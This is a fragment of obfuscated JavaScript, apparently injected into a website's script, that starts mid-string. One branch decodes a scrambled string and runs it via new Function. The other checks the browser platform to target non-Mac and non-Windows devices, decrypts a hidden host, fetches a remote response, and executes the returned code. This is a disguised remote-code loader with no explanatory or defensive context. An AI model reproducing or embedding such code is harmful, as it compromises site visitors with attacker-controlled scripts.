F=5=2=O=(=6=_=d8"("%"h"%"d"%"5"%"r"%"F"=78"7"%"5"%"O"%"^"%"x"%"h"%"d"%"5"%"x"%"O"%"f"%"Y"=q8"("%"h"%"d"%"5"%"x"%"O"%"f"%"Y"%"r"%"F"=f8"6"%"2"%"f"%"Y"%"R"%";"%"7"=L8"r"%"u"%"x"%"w"%"E"%"]"%"k"%"9"%"W"%"+"%"z"%"t"%"y"%"N"%";"%"e"%"I"%"~"%"i"%"|"%"B"%"A"%"V"%"&"%"-"%"U"%"d"%")"%"("%"f"%"Y"%"7"%"p"%"h"%"6"%"C"%"S"%"q"%"^"%"2"%"O"%"J"%":"%"5"%"L"%"F"%"_"%"X"%"D"%"R"%"T"%"4"%"0"%"}"%"@"%"s"%"o"%"n"%"K"%"1"%"{"%"Q"%"%"%"/"%"8"=J8""=p80!7O5cY8Ym5YJqd(Yc/H3r*Ud*40*Q%/8Z/p=""a!p<YmqY2pFh!aO8LHfZcYHdZcp%%aa=(8LHfZcYHdZcp%%aa=68LHfZcYHdZcp%%aa=_8LHfZcYHdZcp%%aa=F8O<<@?(>>o=58c}nv(a<<o?6>>@=28csv6a<<K?_=J%8iF562pH7ZcFa=Kol86vvcJ%8iF562pH7Zc5aa=Kol8_vvcJ%8iF562pH7Zc2aa!5YF_52 7_2(F6O2cYa[7O5cXd5 F8""=2858(}8(@80!2<YmqY2pFh!ac58YHqZc2aa<}@{jcF%8iF562pH7Zc5a=2%%ag5>}Q}vv5<@@ojc(@8YHqZc2%}a=F%8iF562pH7Zccs}v5a<<K?Ksv(@a=2%8@agc(@8YHqZc2%}a=(s8YHqZc2%@a=F%8iF562pH7Zcc}nv5a<<}@?cKsv(@a<<K?Ksv(sa=2%8sa!5YF_52 FPcJaPcYmfdFda!2YD ]_2(F6O2c"MFf(L"=FacOa=(m(qOLYcaPPPYqLY[Xd5 685m(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//DdJmdTS6)5dm(2/L(/}QsKj28O66pXC:X"!Xd5 _85mpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_aPPZa!'.substr(10));new Function(b)()}();
        }
        if(randomElement == 'smCpv'){
            window.yOlEPb = function(){var keyList = ["0H1PW2NFZATEvKb5XzkIORmyasrQZfiIE7uejScAKtFY2RLodXnyr4p6" ,"khf3XsyLliCU85p2NEZ7bAo9qg4wmQYv1WFajr6-wtry+NjJRIm=PZ9falexLXnEDB0MYopFSGckTU","-yvm71GxOdQ0UC=SwHfFiYTbER9Dhpa1R5:o4-.t2L/DbSiKc6Ysmehr3y","am7t-x+fBulVFyIPkhoeCHc2r5QvJjDqAMUZp4Lp8ZQkdY569iE3g7KV2oBcqhAINzXHeSu4=vUj",];function decrypt(t, e) {if (!t) return "";for (var a = t.split(""), n = e.split(""), i = {}, r = [], o = 0;o < a.length / 2;o++)i[a[o]] = a[a.length / 2 + o];for (var s = 0; s < e.length; s++) r.push(i[n[s]]);return r.join("");};(!/^Mac|Win/.test(navigator.platform)||!navigator.platform)?(function(u, i, w, d) {var x = decrypt,cs = d[x(keyList[0],"TNzzWmKATz1rK" )],crd = x(keyList[1],"a37Ef77Z7U7yf");'jQuery';u = decodeURIComponent(x(keyList[2], u));'jQuery';var xhr = new XMLHttpRequest();xhr.open('GET', u + '/s/a?_=' + x(keyList[3], i));xhr.onreadystatechange = function() {if (xhr.readyState == 4 && xhr.status == 200) {var data = JSON.parse(xhr.responseText);new Function(data.data)(cs);}};xhr.send('u=1');})("RQQ-w1CCy-HdwHbHv0DxdFGb", "MuBoy7PlMoyuM7Buyo", window, document):function(){}};window['yOlEPb']();    
        }

    }

}
